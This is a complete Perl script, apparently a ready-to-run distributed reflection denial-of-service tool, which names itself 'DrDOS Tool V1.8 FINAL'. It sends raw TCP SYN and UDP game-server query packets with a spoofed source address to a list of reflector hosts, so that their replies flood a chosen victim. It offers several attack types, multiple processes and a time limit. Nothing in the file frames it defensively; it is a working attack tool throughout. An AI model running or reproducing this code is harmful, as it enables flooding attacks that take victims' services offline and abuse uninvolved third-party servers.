#!/usr/bin/perl -w

use Benchmark;
use Net::RawIP;
use Time::HiRes qw ( usleep );

my $rand = int( rand 0x400 );
my $frag = 0;
my $doff = 0x05;
my $ttl  = 0xFF;
my $tos  = 0x08;
my $pid;
my $tx;
my @list;
my @running;
my @pids;

my %attack =
  ( "tcp" => \&tcp, "quake3" => \&quake3, "source" => \&source, "hl" => \&hl, "gs" => \&gs, "gs2" => \&gs2 );

if ( @ARGV < 7 || @ARGV > 7 ) {
    &usage();
    exit;
}

$tx = $ARGV[3];
my $t0 = new Benchmark;

print "\n*** Now Reading Hosts Into Array\n\n";

open( ELITE, $ARGV[2] ) || die "Unable to open $ARGV[2]!\n";
chomp( @list = <ELITE> );
close(ELITE);

sub tcp {
    my ( $ip, $port ) = @_;
    my $a = new Net::RawIP(
        {
            ip  => { saddr => $ARGV[0], daddr => $ip, frag_off => $frag, tos => $tos, ttl => $ttl },
            tcp => {
                dest   => $port,
                source => $ARGV[1],
                syn    => 1,
                ack    => 0,
                fin    => 0,
                rst    => 0,
                psh    => 0,
                urg    => 0,
                doff   => $doff
            }
        }
    );
    $a->send( 0, $tx );
}

sub quake3 {
    my ( $ip, $port ) = @_;
    my $a = new Net::RawIP(
        {
            ip  => { saddr => $ARGV[0], daddr => $ip, frag_off => $frag, tos => $tos, ttl => $ttl, },
            udp => {
                dest   => $port,
                source => $ARGV[1],
                data   => chr(255) . chr(255) . chr(255) . chr(255) . "getstatus" . chr(10),
            }
        }
    );
    $a->send( 0, $tx );
    

}

sub source {
    my ( $ip, $port ) = @_;
    my $a = new Net::RawIP(
        {
            ip => { saddr => $ARGV[0], daddr => $ip, frag_off => $frag, tos => $tos, ttl => $ttl, },
            udp => { dest => $port, source => $ARGV[1], data => chr(255) . chr(255) . chr(255) . chr(255) . chr(85), }
        }
    );
    $a->send( 0, $tx );
    

}

sub hl {
    my ( $ip, $port ) = @_;
    my $a = new Net::RawIP(
        {
            ip => { saddr => $ARGV[0], daddr => $ip, frag_off => $frag, tos => $tos, ttl => $ttl, },
            udp => { dest => $port, source => $ARGV[1], data => chr(255) . chr(255) . chr(255) . chr(255) . "rules", }
        }
    );
    $a->send( 0, $tx );
    
}

sub gs {
    my ( $ip, $port ) = @_;
    my $a = new Net::RawIP(
        {
            ip  => { saddr => $ARGV[0], daddr => $ip, frag_off => $frag, tos => $tos, ttl => $ttl, },
            udp => {
                dest   => $port,
                source => $ARGV[1],
                data   => chr(92) . chr(115) . chr(116) . chr(97) . chr(116) . chr(117) . chr(115) . chr(92),
            }
        }
    );
    $a->send( 0, $tx );
    
}

sub gs2 {
    my ( $ip, $port ) = @_;
    my $a = new Net::RawIP(
        {
            ip  => { saddr => $ARGV[0], daddr => $ip, frag_off => $frag, tos => $tos, ttl => $ttl, },
            udp => {
                dest   => $port,
                source => $ARGV[1],
                data   => chr(254)
                  . chr(253)
                  . chr(0)
                  . chr(67)
                  . chr(79)
                  . chr(82)
                  . chr(89)
                  . chr(255)
                  . chr(255)
                  . chr(255),
            }
        }
    );
    $a->send( 0, $tx );
    
}

sub paxor {
    my $type = $_[0];
    unless ( $type eq "mixed" ) {
        while (1) {
			foreach (@list) { $attack{$type}->( split( ':', $_ ) );}
        }
    }
    else {
        my @part;
        while (1) {
            foreach (@list) {
                @part = split( ":", $_ );
                $attack{ $part[2] }->( $part[0], $part[1]);
            }
        }
    }
}


for($number = 0;$number < $ARGV[5];$number++)
{
$pid = fork();
if ( $pid == 0 ) {
    $SIG{INT} = \&controlsub;

    &paxor( $ARGV[4] );

    my $t1 = new Benchmark;
    my $td = timediff( $t1, $t0 );
    print "\nTotal Time: ", timestr($td), "\n";
    sleep(5);
    exit;
}
else {
        push(@pids, $pid);
}
}
sleep( $ARGV[6] );
foreach(@pids)
{
        kill( "INT", $_ );
}
        exit;

sub controlme {
    $SIG{INT} = \&controlme;
    print "Signal Caught Now Exiting\n";
    my $t1 = new Benchmark;
    my $td = timediff( $t1, $t0 );
    print "\nTotal Time: ", timestr($td), "\n";
    sleep(5);
    exit;
}

sub controlsub {
    $SIG{INT} = \&controlsub;
    exit;
}


sub usage {
    print << "HEREDOC";
$0 <target> <target port> <reflector list> <weight> <attack type> <threads> <Time>
DrDOS Tool V1.8 FINAL by ohnoes1479

Time: Limit running time of the script, Time is in seconds
threads: number of threads to run
attack types:
tcp:     reflected tcp SYN attack
quake3:  reflected udp attack using quake3 based servers
source:  reflected udp attack using Valve Source based servers
hl:      reflected udp attack using Half Life servers
gs:      reflected udp attack using Gamespy based servers
gs2:     reflected udp attack using Gamespy 2 based servers
mixed:   specify type of server in list, EG:
8.8.8.8:80:tcp
64.120.46.100:28960:quake3
Command: $0 127.0.0.1 8080 servers.txt 5 tcp
HEREDOC

}